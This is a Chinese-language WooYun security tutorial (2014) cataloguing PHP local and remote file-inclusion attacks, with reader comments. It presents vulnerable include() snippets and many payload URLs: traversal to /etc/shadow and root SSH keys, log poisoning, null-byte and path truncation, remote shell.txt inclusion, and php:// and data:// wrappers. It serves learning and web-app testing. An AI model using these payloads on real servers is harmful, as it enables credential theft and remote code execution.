<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">PHP文件包含漏洞总结</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">Kuuki</a> <span class="bull">·</span> <time title="2014/11/12 12:01" ui-time="" datetime="2014/11/12 12:01" class="published ng-binding ng-isolate-scope">2014/11/12 12:01</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h2>0x00 前言</h2><hr><p>PHP文件包含漏洞的产生原因是在通过PHP的函数引入文件时，由于传入的文件名没有经过合理的校验，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。最常见的就属于本地文件包含（Local File Inclusion）漏洞了。</p><p>我们来看下面一段index.php代码:</p><pre><code>#!php
if ($_GET['func']) {
   include $_GET['func'];
} else {
   include 'default.php';
}
</code></pre><p>程序的本意可能是当提交url为http://example.com/index.php?func=add.php时，调用add.php里面的样式内容和功能。直接访问http://example.com/index.php则会包含默认的default.php</p><p>那么问题来了，如果我们提交http://example.com/index.php?func=upload/pic/evil.jpg ，且evil.jpg是由黑客上传到服务器上的一个图片，在图片的末尾添加了恶意的php代码，那么恶意的代码就会被引入当前文件执行。</p><p><a href="http://drops.wooyun.org/wp-content/uploads/2014/11/file0001.png"><img alt="" title="file0001" width="458" height="67" class="aligncenter size-full wp-image-3837" img-src="2014111204023183499.png"></a></p><p>如果被包含的文件中无有效的php代码，则会直接把文件内容输出。</p><p>在接下来的内容中会以代码样本作为例子，来给大家介绍各种奇葩猥琐的利用姿势。</p><h2>0x01 普通本地文件包含</h2><hr><pre><code>#!php
&lt;?php include("inc/" . $_GET['file']); ?&gt;
</code></pre><ul><li><p>包含同目录下的文件：<br>?file=.htaccess</p></li><li><p>目录遍历：</p></li></ul><p>?file=../../../../../../../../../var/lib/locate.db ?file=../../../../../../../../../var/lib/mlocate/mlocate.db</p><p>（linux中这两个文件储存着所有文件的路径，需要root权限）</p><ul><li><p>包含错误日志： ?file=../../../../../../../../../var/log/apache/error.log （试试把UA设置为“<?phpinfo();?>”来使payload进入日志）</p></li><li><p>获取web目录或者其他配置文件：</p></li></ul><p>?file=../../../../../../../../../usr/local/apache2/conf/httpd.conf</p><p>（更多→http://wiki.apache.org/httpd/DistrosDefaultLayout）</p><ul><li>包含上传的附件：</li></ul><p>?file=../attachment/media/xxx.file</p><ul><li>读取session文件：</li></ul><p>?file=../../../../../../tmp/sess_tnrdo9ub2tsdurntv0pdir1no7</p><p>（session文件一般在/tmp目录下，格式为sess_[your phpsessid value]，有时候也有可能在/var/lib/php5之类的，在此之前建议先读取配置文件。在某些特定的情况下如果你能够控制session的值，也许你能够获得一个shell）</p><ul><li>如果拥有root权限还可以试试读这些东西：</li></ul><p>/root/.ssh/authorized_keys</p><p>/root/.ssh/id_rsa</p><p>/root/.ssh/id_rsa.keystore</p><p>/root/.ssh/id_rsa.pub</p><p>/root/.ssh/known_hosts</p><p>/etc/shadow</p><p>/root/.bash_history</p><p>/root/.mysql_history</p><p>/proc/self/fd/fd[0-9]* (文件标识符)</p><p>/proc/mounts</p><p>/proc/config.gz</p><ul><li>如果有phpinfo可以包含临时文件：</li></ul><p>参见http://hi.baidu.com/mmnwzsdvpkjovwr/item/3f7ceb39965145eea984284el</p><h2>0x02 有限制的本地文件包含</h2><hr><pre><code>#!php
&lt;?php include("inc/" . $_GET['file'] . ".htm"); ?&gt; 
</code></pre><ul><li>%00截断：</li></ul><p>?file=../../../../../../../../../etc/passwd%00</p><p>(需要 magic&#95;quotes&#95;gpc=off，PHP小于5.3.4有效)</p><ul><li>%00截断目录遍历：</li></ul><p>?file=../../../../../../../../../var/www/%00</p><p>(需要 magic&#95;quotes&#95;gpc=off，unix文件系统，比如FreeBSD，OpenBSD，NetBSD，Solaris)</p><ul><li>路径长度截断：</li></ul><p>?file=../../../../../../../../../etc/passwd/././././././.[…]/./././././.</p><p>(php版本小于5.2.8(?)可以成功，linux需要文件名长于4096，windows需要长于256)</p><ul><li>点号截断：</li></ul><p>?file=../../../../../../../../../boot.ini/………[…]…………</p><p>(php版本小于5.2.8(?)可以成功，只适用windows，点号需要长于256)</p><h2>0x03 普通远程文件包含</h2><hr><pre><code>#!php
&lt;?php include($_GET['file']); ?&gt;
</code></pre><ul><li>远程代码执行：</li></ul><p>?file=[http|https|ftp]://example.com/shell.txt</p><p>(需要allow&#95;url&#95;fopen=On并且 allow&#95;url&#95;include=On)</p><ul><li>利用php流input：</li></ul><p>?file=php://input</p><p>(需要allow&#95;url&#95;include=On，详细→http://php.net/manual/en/wrappers.php.php)</p><ul><li>利用php流filter：</li></ul><p>?file=php://filter/convert.base64-encode/resource=index.php</p><p>(同上)</p><ul><li>利用data URIs：</li></ul><p>?file=data://text/plain;base64,SSBsb3ZlIFBIUAo=</p><p>(需要allow&#95;url&#95;include=On)</p><ul><li>利用XSS执行任意代码：</li></ul><p>?file=http://127.0.0.1/path/xss.php?xss=phpcode</p><p>(需要allow&#95;url&#95;fopen=On，allow&#95;url&#95;include=On并且防火墙或者白名单不允许访问外网时，先在同站点找一个XSS漏洞，包含这个页面，就可以注入恶意代码了。条件非常极端和特殊- -)</p><h2>0x04 有限制的远程文件包含</h2><hr><pre><code>#!php
&lt;?php include($_GET['file'] . ".htm"); ?&gt; 
</code></pre><ul><li><p>?file=http://example.com/shell</p></li><li><p>?file=http://example.com/shell.txt?</p></li><li><p>?file=http://example.com/shell.txt%23</p></li></ul><p>(需要allow&#95;url&#95;fopen=On并且allow&#95;url&#95;include=On)</p><ul><li>?file=\evilshare\shell.php (只需要allow&#95;url&#95;include=On)</li></ul><h2>0x05 延伸</h2><hr><p>其实在前面也说了，这些漏洞产生原因是PHP函数在引入文件时，传入的文件名没有经过合理的校验，从而操作了预想之外的文件。实际上我们操作文件的函数不只是include()一个，上面提到的一些截断的方法同样可以适用于以下函数：</p><p><a href="http://drops.wooyun.org/wp-content/uploads/2014/11/file0002.png"><img alt="" title="file0002" width="193" height="326" class="aligncenter size-full wp-image-3838" img-src="2014111204023129613.png"></a></p><p>参考文章:</p><p>http://websec.wordpress.com/2009/11/28/freebsd-directory-listing-with-php-file-functions/</p><p>http://www.digininja.org/blog/when&#95;all&#95;you&#95;can&#95;do&#95;is&#95;read.php</p><p>http://wiki.apache.org/httpd/DistrosDefaultLayout</p><p>http://ddxhunter.wordpress.com/2010/03/10/lfis-exploitation-techniques/</p><p>http://www.coresec.org/2011/05/12/local-file-inclusion-to-remote-command-execution-using-ssh/</p><p>http://www.ush.it/2009/02/08/php-filesystem-attack-vectors/</p><p>http://websec.wordpress.com/2010/02/22/exploiting-php-file-inclusion-overview/</p><p>http://diablohorn.wordpress.com/2010/01/16/interesting-local-file-inclusion-method/</p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div class="yarpp-related"><h3>为您推荐了适合您的技术文章:</h3><ol id="recommandsystem"><li><a href="http://drops.wooyun.org/tips/11757" rel="bookmark" id="re1">打造自己的php半自动化代码审计工具</a></li><li><a href="http://drops.wooyun.org/tips/12747" rel="bookmark" id="re2">利用XSLT继续击垮XML</a></li><li><a href="http://drops.wooyun.org/tips/413" rel="bookmark" id="re3">CentOS 6.2下安装基于Suricata + Barnyard 2 + Base 的⼊侵检测系统</a></li><li><a href="http://drops.wooyun.org/papers/653" rel="bookmark" id="re4">搭建基于Suricata+Barnyard2+Base的IDS前端Snorby</a></li></ol></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">von</span> <span class="reply-time">2016-06-04 09:03:55</span></div><p></p><p>好文章，已收集到博客</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">少宇</span> <span class="reply-time">2016-04-30 22:28:45</span></div><p></p><p>感谢分享，文章不错，再配些靶机图就极好了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">123</span> <span class="reply-time">2016-02-23 14:57:40</span></div><p></p><p>nice</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">冷空气999</span> <span class="reply-time">2015-11-23 21:29:57</span></div><p></p><p>这个是我发的啊，哈哈哈哈哈，还有下边一条。只是不小心手残想评论下帖子，打扰了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">冷空气999</span> <span class="reply-time">2015-11-23 21:26:05</span></div><p></p><p>hahahahhhhhhhhhhhhhhhhhhhhhhhhhhhhaaaaaaaaaaaaaaaaaaaaaaaaa</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">冷空气999</span> <span class="reply-time">2015-09-29 15:18:25</span></div><p></p><p>学习了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">backda0</span> <span class="reply-time">2015-09-28 09:48:17</span></div><p></p><p>啊哟，这个屌·</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">BeenQuiver</span> <span class="reply-time">2015-08-20 14:40:43</span></div><p></p><p>能不能再写一些java包含相关</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">hope</span> <span class="reply-time">2015-07-01 15:02:16</span></div><p></p><p>涨姿势了！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">银荡的小帅哥</span> <span class="reply-time">2014-11-20 09:26:26</span></div><p></p><p>赞..</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Vinc</span> <span class="reply-time">2014-11-18 17:36:15</span></div><p></p><p>对于这种文章 我只能说一句 赞</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">迦南</span> <span class="reply-time">2014-11-16 22:33:57</span></div><p></p><p>涨姿势+1</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">sb</span> <span class="reply-time">2014-11-13 14:06:25</span></div><p></p><p>sbsb</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">小饼仔</span> <span class="reply-time">2014-11-13 11:47:28</span></div><p></p><p>涨姿势了！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">bitcoin</span> <span class="reply-time">2014-11-12 22:59:08</span></div><p></p><p>丽嗨</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">龍 、</span> <span class="reply-time">2014-11-12 21:02:54</span></div><p></p><p>涨姿势了！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">px1624</span> <span class="reply-time">2014-11-12 14:27:15</span></div><p></p><p>涨姿势了！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">mickey</span> <span class="reply-time">2014-11-12 13:55:39</span></div><p></p><p>嗯。 学习了，感谢分析 。</p><p>貌似还是漏了点东西</p><p>http://www.longge.com/woaini.php?file=conf&lt;&lt;</p><p>当然只对win</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">xy小雨</span> <span class="reply-time">2014-11-12 12:42:31</span></div><p></p><p>good</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">p4sser</span> <span class="reply-time">2014-11-12 12:29:41</span></div><p></p><p>好文章 学习了 Orz</p><p></p></div></div></div></div></div></main>